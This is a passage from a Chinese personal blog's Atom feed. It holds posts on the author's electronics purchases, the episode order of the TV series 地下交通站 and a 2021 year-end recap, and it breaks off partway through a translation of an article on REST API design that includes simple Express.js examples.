<p>那一天我从这条路上走过，愉快地想着未来，<br>
因为上帝允许不存在的事闪亮。<br>
今天，走在这条路上，我甚至不会愉快地回忆过去。<br>
最多，是什么都不想……<br>
我似乎看到两道人影在这条路上错身而过，不是彼时，亦非此时，<br>
而是此地，没有被时间打扰的错身而过。<br>
我们互相无动于衷。<br>
那个旧我沿街走去，想象一朵未来的向日葵。<br>
那个今我沿街走来，什么都不想象。</p>
<p>也许这真的发生过……<br>
确实地发生过……<br>
是的，真实地发生过……</p>
<p>是的，也许……</p>
]]></content></entry><entry><title type="html">今年的电子产品</title><link href="https://blog.batkiz.com/posts/2023-electronic-products/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/2023-electronic-products/</id><published>2024-01-20T01:01:23+08:00</published><updated>2024-01-20T01:01:23+08:00</updated><content type="html"><![CDATA[<blockquote>一起来看看今年脑子里进了多少水吧。</blockquote><p>一起来看看今年脑子里进了多少水吧。</p>
<h2 id="xiaomi-13">Xiaomi 13</h2>
<p>之前在用小米 10s，某天曲面屏意外爆掉了，考虑到更换屏幕总成的价格已经几乎是手机购入价的一半，所以没考虑太久就去小米之家以旧换新成了小米 13。</p>
<p>到现在我对这台手机都是相当满意的，小屏、直屏，素皮版的手感很棒还不怕滑，徕卡影像也能直出很不错的照片。最大的遗憾是买了 8+256 而非 12+256 版本。</p>
<p>此外我在持续关注新一代 iPhone SE，期待能在今年上半年上市。</p>
<h2 id="加湿器">加湿器</h2>
<p>不知道我当时脑子是哪有坑才买了这玩意，出给住在西安的朋友了。</p>
<h2 id="nikon-z5--nikkor-24mm200mm-f463--nikkor-50mm-f18-s">Nikon Z5 + Nikkor 24mm<del>200mm f/4</del>6.3 + Nikkor 50mm f/1.8 S</h2>
<p>由于我的需求非常明确：全画幅；入门款（也就是便宜）。因此实际上没什么选择的余地，无非是尼康 z5 或松下 s5。</p>
<p>考虑到我拍视频的意愿较低，且 L 卡口家族除了松下就是徕卡……没考虑太久就决定买 z5 了。</p>
<p>之后也去顺电摸了摸各个牌子的相机和镜头，很心动 24~120mm / f4，但太贵了；索尼的对焦真的快；很需要人体工程学（a.k.a 手柄），要不然持握手感真的差。</p>
<p>最终在双十一前果断入手 Nikon Z5 + Nikkor 24mm<del>200mm/f4</del>f6.3 套机，后续在双十一时还价保了一下，很舒服。这个大变焦头在白天非常好用，堪称旅游神头。不过由于光圈太小只能天黑就回家，因此紧随其后便补了一枚 Nikkor 50mm f/1.8 S，用于天黑后拍照（bushi）。不过在元旦期间日本的行程中，发现 50mm 用起来非常顺手，后续也会尽可能提升下自己的构图水平。</p>
<p>再往后的话大概就是换新 Z6 iii 以及补一下 35mm f/1.8 与 85mm f/1.8 两枚定焦了。（有人送我一下 Noct 与 Plena 吗</p>
<h2 id="ps5">PS5</h2>
<p>之前买的 NS 吃灰太久了，于是便出给了朋友，拿这份钱买了台 PS5。</p>
<p>目前玩的游戏不多，最大的用处是启动原神。以及星铁国服什么时候能上？</p>
<h2 id="32g-ddr4--2">32G DDR4 * 2</h2>
<p>这条倒是没啥好说的，把电脑升级到了 128G 内存，很爽。</p>
<h2 id="文石-boox-leaf2-白色版">文石 BOOX Leaf2 白色版</h2>
<p>上一款设备还是 2017 年左近购入的二手 Kindle paperwhite 3，虽然确实还能用，但性能也确实太差了。以及我很想要一个具有实体翻页键的电纸书设备，因此决定进行一次换新。</p>
<p>重新整理下我的需求：</p>
<ul>
<li>实体翻页键：这一条是必须的，因为换的原因就是这个。</li>
<li>最好是封闭系统：电纸书是一个用途很明确的设备，因此封闭系统比起开放系统能做更多裁剪，省点电。当然考虑到目前各家厂商的现状，这个只是个添头</li>
<li>最好在翻页键一侧有更多配重。这个也是添头。</li>
</ul>
<p>考虑到以上需求，当时可以考虑的设备大概有：</p>
<ul>
<li>Kobo libra 2：考虑到海淘会丢保修，以及在香港摸了摸，觉得阅读器 UI 有点不太好用，pass</li>
<li>Kindle Oasis 2：哪哪都好，就是没换 type-c。。。。</li>
<li>Boox Leaf 2：勉强符合需求，当时正好出了新的白色版，考虑到其屏幕较黑色版的更好一些，因此入手了白色版。而且文石的系统可以选择京东阅读作为书城，我的京东 Plus 送的会员刚好能用上。</li>
<li>掌阅不知道哪一款：我对掌阅的印象不是太好，因此不考虑。</li>
</ul>
<p>用了几个月下来，还是发现了一些缺点的：</p>
<ul>
<li>偶尔会闪退，这是最影响体验的点</li>
<li>自带的词典不行，很多字查不到；加入太大的词典的话会根本不可用（考虑到处理器的性能与内存大小，倒也算合理）；阅读器中没有类似于 kindle 中生字注音的功能。</li>
<li>京东阅读书城的筛选功能太差了，筛选和搜索的体验都不是太好。</li>
</ul>
<p>不过整体上还算是满意，但现在如果新购入的话就会考虑新出的<a href="https://www.mi.com/shop/buy/detail?product_id=19562">小米电纸书</a>或者等下一代 kindle oasis 了。</p>
<h2 id="fosi-audio-c1">Fosi Audio C1</h2>
<p>这个也没什么好说的，显示器自带的音响太烂了，迫切需要一个外置的独立音响。当时又在 b 站看到了较多这款的视频，考虑到价格与够用就行的需求，因此直接购入，用到现在感觉都还 ok。</p>
<p>考虑到 89 元的价钱，现在来看都肯定不算亏。</p>
]]></content></entry><entry><title type="html">关于地下交通站的一些闲言碎语</title><link href="https://blog.batkiz.com/posts/dixiajiaotongzhan/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/dixiajiaotongzhan/</id><published>2024-01-13T11:56:02+00:00</published><updated>2024-01-13T11:56:02+00:00</updated><content type="html"><![CDATA[<p>原本是计划写一篇关于地下交通站的考据的，不过考虑到一则本人的水平属于半瓶子晃荡，就不出来丢人了；二则有些内容也不能算是考据。因此就想到哪写到哪算哪吧。</p>
<hr>
<p>大家都知道地下交通站存在着 30 集与 28 集两个版本，两个版本的主要区别是 28 集版较 30 集版合并了整装待发、初战告捷两集为初战告捷一集，并删除了原本第一集中大量的人物介绍片段；同时删去了尹相杰出演的弃暗投明一集。</p>
<p>其中弃暗投明一集删去的原因网上有些人推测为尹相杰吸毒一事导致。但地下交通站首播于 2007 年，尹相杰吸毒暴露于大众视野发生在 2015 年；同时网上流传的弃暗投明一集（或者可以放大到整个 30 集版本）的资源画面质量均较差。因此我认为 30 集删减为 28 集应是制作团队较早便决定的事。<a href="https://www.bilibili.com/video/BV1Ts411a7VA">B 站上有些评论</a>也与我的观点相合。</p>
<p>更新：在上面链接的评论中找到了本剧编剧在抖音上的发言：</p>
<blockquote>
<p>@短视频幽默 白志龙：那两集是因为山东台为了自己的播出周期强行删掉的。第一集整装待发，第二集初战告捷，被合成一集，还有就是这一集（被删），所以大家看到的是二十八集</p>
</blockquote>
<hr>
<p>下面给出两个版本的具体剧集安排：</p>
<table>
  <thead>
      <tr>
          <th>集数</th>
          <th>30 集版</th>
          <th>28 集版</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>1</td>
          <td>整装待发</td>
          <td>初战告捷</td>
      </tr>
      <tr>
          <td>2</td>
          <td>初战告捷</td>
          <td>虎口脱险</td>
      </tr>
      <tr>
          <td>3</td>
          <td>虎口脱险</td>
          <td>一条麻袋</td>
      </tr>
      <tr>
          <td>4</td>
          <td>一条麻袋</td>
          <td>寻枪</td>
      </tr>
      <tr>
          <td>5</td>
          <td>神机妙算（上）</td>
          <td>神机妙算（上）</td>
      </tr>
      <tr>
          <td>6</td>
          <td>神机妙算（下）</td>
          <td>神机妙算（下）</td>
      </tr>
      <tr>
          <td>7</td>
          <td>一箭双雕（上）</td>
          <td>一箭双雕（上）</td>
      </tr>
      <tr>
          <td>8</td>
          <td>一箭双雕（下）</td>
          <td>一箭双雕（下）</td>
      </tr>
      <tr>
          <td>9</td>
          <td>药到病除</td>
          <td>药到病除</td>
      </tr>
      <tr>
          <td>10</td>
          <td>插翅难逃</td>
          <td>火眼金睛</td>
      </tr>
      <tr>
          <td>11</td>
          <td>寻枪</td>
          <td>第二战场（上）</td>
      </tr>
      <tr>
          <td>12</td>
          <td>火眼金睛</td>
          <td>第二战场（下）</td>
      </tr>
      <tr>
          <td>13</td>
          <td>第二战场（上）</td>
          <td>将计就计（上）</td>
      </tr>
      <tr>
          <td>14</td>
          <td>第二战场（下）</td>
          <td>将计就计（下）</td>
      </tr>
      <tr>
          <td>15</td>
          <td>弃暗投明</td>
          <td>插翅难逃</td>
      </tr>
      <tr>
          <td>16</td>
          <td>狗咬狗</td>
          <td>抗日英雄</td>
      </tr>
      <tr>
          <td>17</td>
          <td>将计就计（上）</td>
          <td>金蝉脱壳（上）</td>
      </tr>
      <tr>
          <td>18</td>
          <td>将计就计（下）</td>
          <td>金蝉脱壳（下）</td>
      </tr>
      <tr>
          <td>19</td>
          <td>金蝉脱壳（上）</td>
          <td>巧入敌阵（上）</td>
      </tr>
      <tr>
          <td>20</td>
          <td>金蝉脱壳（下）</td>
          <td>巧入敌阵（下）</td>
      </tr>
      <tr>
          <td>21</td>
          <td>巧入敌阵（上）</td>
          <td>走向光明（上）</td>
      </tr>
      <tr>
          <td>22</td>
          <td>巧入敌阵（下）</td>
          <td>走向光明（下）</td>
      </tr>
      <tr>
          <td>23</td>
          <td>走向光明（上）</td>
          <td>从天而降（上）</td>
      </tr>
      <tr>
          <td>24</td>
          <td>走向光明（下）</td>
          <td>从天而降（下）</td>
      </tr>
      <tr>
          <td>25</td>
          <td>从天而降（上）</td>
          <td>狗咬狗</td>
      </tr>
      <tr>
          <td>26</td>
          <td>从天而降（下）</td>
          <td>夜袭</td>
      </tr>
      <tr>
          <td>27</td>
          <td>抗日英雄</td>
          <td>罪有应得（上）</td>
      </tr>
      <tr>
          <td>28</td>
          <td>夜袭</td>
          <td>罪有应得（下）</td>
      </tr>
      <tr>
          <td>29</td>
          <td>罪有应得（上）</td>
          <td></td>
      </tr>
      <tr>
          <td>30</td>
          <td>罪有应得（下）</td>
          <td></td>
      </tr>
  </tbody>
</table>
<hr>
<p>地下交通站作为情景喜剧，虽然各集内容类似于单元剧，但部分剧集间是有着明确的前后关系的。如从天而降、罪有应得应在走向光明之后，因为剧情上白翻译为我方提供了助力。</p>
<hr>
<p>夜袭一集我之前一直以为应发生的较早，主要原因是全福的突然上线，要知道全福在剧情后半段已经很少出现，所以我以为是剧集安排上出现了问题。</p>
<p>不过后面细琢磨了下剧情，发现这一集确实应放在剧情靠后、乃至到结局的罪有应得之前</p>
<ul>
<li>
<p>一则夜袭一集应是在抗日英雄一集之后，因为剧情上贾队长明确讲了&quot;上次黑藤太君在这儿搞亲善&quot;一事，该剧情发生在抗日英雄一集。</p>
</li>
<li>
<p>二则黑藤在本集中对鼎香楼的态度是&quot;贼心不死&quot;，放在整个电视剧的前半段确实不合理</p>
</li>
</ul>
<p>想来全福的突然上线应该与黑藤太君忽高忽低的中文水平一样，与影视制作流程有关，这些片段应该拍摄较早。</p>
<hr>
<p>抗日英雄一集中，白翻译向野尻等人朗诵八路传单时，语气有些微妙，因此剧情应是发生在白翻译被策反之后。在 28 集版中，抗日英雄一集却被安排在了走向光明之前。这里的安排是不如 30 集的原版本的。</p>
<hr>
<p>此外，在 28 集版中，走向光明一集中石青山首次找白翻译谈话时，提到了&quot;小林伸二失踪拿回&quot;，但此集被删掉了，算是剪辑上的纰漏。</p>
]]></content></entry><entry><title type="html">Bye 2021</title><link href="https://blog.batkiz.com/posts/bye-2021/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/bye-2021/</id><published>2021-12-31T19:38:07+08:00</published><updated>2021-12-31T19:38:07+08:00</updated><content type="html"><![CDATA[<blockquote>一元复始，万象更新。</blockquote><p>Hi 亲爱的朋友们，新年快乐！</p>
<p>今年从三月后没有再更新过文章，先在这里道一声歉。</p>
<p>2021 年对我来说是非常特殊的一年。</p>
<p>年初的考研，成绩不出我所料没有考上；上半年时花了点时间，面试了许多家公司，最终选择了腾讯；之后顺利从大学毕业，来到了广州。</p>
<p>接下来就是被社会暴打的半年，工作繁忙，完全没有时间读书、写代码、写文章了。下一次发文章，可能就是到我跳槽的那天了吧。</p>
<p>除了这些外，似乎就没什么可说的了。不过还是写点东西出来吧。</p>
<hr>
<h2 id="学习">学习</h2>
<p>年初时学了 rust，有点搞不懂所有权模型，但其他的语法特性蛮喜欢的（特指函数式编程方面），写了点代码玩了玩，不过当时的电脑性能太差，跑不动编译，也就没再往下深入了。期待什么时候可以把 rust 学会。</p>
<p>上半年时学了点 F#，蛮喜欢的，不过学了点后就毕业开始工作了，没啥时间继续看，挺可惜的。</p>
<p>在读刘新宇老师的 <a href="https://github.com/liuxinyu95/AlgoXY">算法新解</a>，其实大学时就借过这本书，不过当时没怎么看。里边关于红黑树的函数式解法真的是醍醐灌顶。</p>
<p>在读 DDIA 和 数据密集型应用系统设计，还没读太多。其他的一些零碎阅读就不说了。</p>
<h2 id="工具">工具</h2>
<p>以前用了下 tabnine，感觉不太行，copilot 非常惊艳。</p>
<p>logseq 很好用，完美符合我对笔记软件的期待，只可惜不能当一个纯粹的 md 编辑器来用。</p>
<p>tectonic 作为 $\LaTeX$ 发行版很不错。</p>
<p>原计划自己写个 homebrew/scoop 的替代的，但是工作太忙了，完全没有时间。</p>
<h2 id="电子产品">电子产品</h2>
<p>有了工资后买了不少电子产品。</p>
<p>新的笔记本电脑。AMD R7 5800U 的 U，性能很棒，编译 rust 程序不卡了。</p>
<p>iPad Pro 2021 11寸，with Apple Pencil。看 PDF 和视频很舒服，Pencil 也不错，不过我手残，不太会写写画画，一般都是用来当电子白板时用一下。</p>
<p>投影仪。流明数不高，不过晚上拉上窗帘的话体验还是不错的，可惜买的早，没有自动对焦和梯形校正功能，不过又不是不能用。</p>
<p>计划买个 HPE Microserver Gen 10 Plus，感觉有点贵，还在纠结。</p>
<p>米家骑记电助力折叠自行车。（大概也能算电子产品？）收的一代二手，成色很新，通勤幸福感极大提升。</p>
<p>降噪耳机。非常有用，不过由于上班不挤地铁，用的不多。</p>
<h2 id="其他">其他</h2>
<p><del>加班挺厉害的，想跑，唉。</del></p>
<p>其他似乎没什么写的了，那就在此祝大家新年快乐吧。</p>
]]></content></entry><entry><title type="html">翻译|REST API 设计最佳实践</title><link href="https://blog.batkiz.com/posts/best-practices-for-rest-api-design/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/how-seo-ruined-the-internet/?utm_source=atom_feed" rel="related" type="text/html" title="翻译 | SEO 是如何毁掉互联网的"/><link href="https://blog.batkiz.com/posts/advice-to-new-programmers/?utm_source=atom_feed" rel="related" type="text/html" title="翻译 | 给新手程序员们的建议"/><link href="https://blog.batkiz.com/posts/translation-the-rise-and-demise-of-rss/?utm_source=atom_feed" rel="related" type="text/html" title="翻译 | RSS 的兴起与衰落"/><id>https://blog.batkiz.com/posts/best-practices-for-rest-api-design/</id><published>2021-03-18T18:51:25+08:00</published><updated>2021-03-18T18:51:25+08:00</updated><content type="html"><![CDATA[<blockquote>在这篇文章中，我们将探讨如何设计 REST API，使其对任何使用它们的人来说都是容易理解的，是面向未来的，并且是安全和快速的，因为它们为可能是机密的客户提供数据。</blockquote><p>原文链接：<a href="https://stackoverflow.blog/2020/03/02/best-practices-for-rest-api-design/">Best practices for REST API design</a></p>
<p>译者按：关于 REST API 的介绍与最佳实践，亦可参见微软 <a href="https://docs.microsoft.com/zh-cn/azure/architecture/best-practices/api-design">Web API 设计</a>。</p>
<p>声明：本文的完成亦有 <a href="https://www.deepl.com/">DeepL</a> 的帮助。</p>
<hr>
<p>REST API 是现今最常见的网络服务之一。它允许包括浏览器在内的多种客户端通过 REST API 与服务器进行通信。</p>
<p>因此，正确地设计 REST API 非常重要，这样我们就不会在后续的道路上出现问题。我们必须考虑到 API 用户的账号安全性、性能和易用性。</p>
<p>否则，我们就会给使用我们 API 的客户们带来问题，这并不令人愉快，也会影响人们使用我们的 API。如果我们不遵循普遍接受的惯例，那么我们就会给 API 的维护者和使用它们的客户带来困扰，因为它与大家所期望的不同。</p>
<p>在这篇文章中，我们将探讨如何设计 REST API，使其对任何使用它们的人来说都是容易理解的，是不会过时的，并且是安全和快速的，因为它们向客户提供的数据可能是保密的。</p>
<p>由于网络应用可能会被多种问题破坏，我们应该确保任何 REST API 都应使用标准的 HTTP 状态码，以优雅地处理错误，帮助用户处理问题。</p>
<h2 id="用-json-接收与响应">用 JSON 接收与响应</h2>
<p>REST API 应该接收 JSON 作为请求的有效载荷（payload），同时也应以 JSON 发送响应。JSON 是传输数据的标准。几乎所有的网络技术都可以使用它：JavaScript 有内置的方法，可以通过 Fetch API 或其他 HTTP 客户端对 JSON 进行编码和解码。服务器端的技术也有一些库可以解码 JSON，不需要做太多工作。</p>
<p>当然，还有其他传输数据的方式。XML 并没有得到框架的广泛支持，其常用替代通常是 JSON。我们在客户端——尤其是在浏览器中——不能特别容易地操作这些数据。光是做正常的数据传输就会有很多额外的工作。</p>
<p>表单数据（form data）很适合用于发送数据，特别是当我们要发送文件时。但是对于文本和数字，我们不需要表单数据来传输这些，因为——对大多数框架来说——我们只需要在客户端直接从中获取数据就可以传输 JSON。这是到目前为止最直接的做法。</p>
<p>为了确保当我们的 REST API 应用以 JSON 响应时，客户端会将其解释为 JSON，我们应该在请求发出后，将响应头（header）中的 <code>Content-Type</code> 设置为 <code>application/json</code>。很多服务器端应用框架都会自动设置响应头。一些 HTTP 客户端会根据 <code>Content-Type</code> 响应头来解析数据。</p>
<p>唯一的例外是，如果我们试图在客户端和服务器之间发送和接收文件。那么我们就需要处理文件响应，从客户端向服务器发送表单数据。但这就是另外一个话题了。</p>
<p>我们还应该确保我们的端点（endpoint）能够返回 JSON 作为响应。许多服务器端框架都将此作为一个内置功能。</p>
<p>让我们来看看一个接受 JSON payload 的 API 示例。这个例子将使用 Node.js 的 <a href="https://expressjs.com/">Express</a> 后端框架。我们可以使用 <a href="https://www.npmjs.com/package/body-parser"><code>body-parser</code> 中间件</a> 来解析 JSON 请求体，然后我们可以调用 <code>res.json</code> 方法，将我们想要返回的对象构造为 JSON 响应，如下所示。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;body-parser&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;server started&#34;</span>));
</span></span></code></pre></div><p><code>bodyParser.json()</code> 将 JSON 请求体字符串解析为 JavaScript 对象，然后将其分配给 <code>req.body</code> 对象。</p>
<p>将响应中的 <code>Content-Type</code> 头设置为 <code>application/json; charset=utf-8</code>，不要做任何修改。这个方法适用于大多数其他后端框架。</p>
<h2 id="在端点路径中使用名词而非动词">在端点路径中使用名词而非动词</h2>
<p>我们不应该在端点路径中使用动词。相反，我们应该使用名词作为路径名，该名词应代表我们要检索或操作的端点的实体。</p>
<p>这是因为我们的 HTTP 请求方法已经在用动词了。在我们的 API 端点路径中使用动词并没有益处，而且会使它变得不必要的长，因为它没有传达任何新的信息。选择的动词可以根据开发者的想法而变化。比如说，有些人喜欢用 &ldquo;get&rdquo;，有些人喜欢用 &ldquo;retrieve&rdquo;，所以让 HTTP GET 动词告诉我们什么和端点做什么就好了。</p>
<p>动作应该由我们所做的 HTTP 请求方法来表示。最常见的方法包括 GET、POST、PUT 和 DELETE。</p>
<p>GET 检索资源。POST 向服务器提交新数据。PUT 更新现有数据。DELETE 删除数据。这些动词映射到 <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a> 操作。</p>
<p>考虑到我们上面讨论的两个原则，我们应该创建像 GET <code>/articles/</code> 这样的路由来获取新闻文章。同样，POST <code>/articles/</code> 用于添加新的文章，PUT <code>/articles/:id</code> 用于用给定的 id 更新文章。DELETE <code>/articles/:id</code> 用于删除给定 ID 的现有文章。</p>
<p><code>/articles</code> 代表一个 REST API 资源。例如，我们可以使用 Express 添加以下端点来操作文章，如下所示。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;body-parser&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/articles&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">articles</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 获取文章的代码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">articles</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/articles&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 添加新文章的代码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;/articles/:id&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">id</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 更新文章的代码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#66d9ef">delete</span>(<span style="color:#e6db74">&#34;/articles/:id&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">id</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 删除文章的代码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">deleted</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">id</span> });
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;server started&#34;</span>));
</span></span></code></pre></div><p>在上面的代码中，我们定义了操作文章的端点。我们可以看到，路径名中没有任何动词。所有的都是名词。动词在 HTTP 动词中。</p>
<p>POST、PUT 和 DELETE 端点都以 JSON 作为请求体，也都以 JSON 作为响应返回，包括 GET 端点。</p>
<h2 id="使用名词复数来命名集合">使用名词复数来命名集合</h2>
<p>我们应该用名词复数来命名集合。我们通常不会只想得到一个单项，所以我们的命名应该是一致的，我们应该用名词复数。</p>
<p>我们使用名词复数是为了和我们数据库中的内容保持一致。表通常有多个条目，并且在命名时会反映这一点，所以为了与它们保持一致，我们应该使用与 API 访问的表相同的语言。</p>
<p>对于 <code>/articles</code> 端点，我们的所有端点都是复数形式，所以我们不必将其改为复数。（译者注：此处似乎指的是上面代码之中的端点）</p>
<h2 id="分层对象的资源嵌套">分层对象的资源嵌套</h2>
<p>在处理嵌套资源的端点的路径时，应把嵌套资源追加为父资源后面的路径上。</p>
<p>我们必须确保我们考虑的嵌套资源与我们数据库表中的资源相匹配。否则会非常混乱。</p>
<p>比如说，如果我们想要一个端点来获取一篇新闻文章的评论，我们应该将 <code>/comments</code> 追加到 <code>/articles</code> 路径的末尾。这假设了我们在数据库中把评论（<code>comments</code>）作为文章（<code>articles</code>）的一个子节点。</p>
<p>例如，我们可以在 Express 中使用以下代码来实现。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;body-parser&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/articles/:articleId/comments&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">articleId</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">comments</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 通过 articleId 获取评论的代码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">comments</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;server started&#34;</span>));
</span></span></code></pre></div><p>在上面的代码中，我们可以在路径 <code>'/articles/:articleId/comments'</code> 上使用 GET 方法。我们获取由 <code>articleId</code> 标识的文章的评论，然后在响应中返回。我们在 <code>'/articles/:articleId'</code> 路径后添加 <code>'comments'</code>，以表明它是 <code>/articles</code> 的子资源。</p>
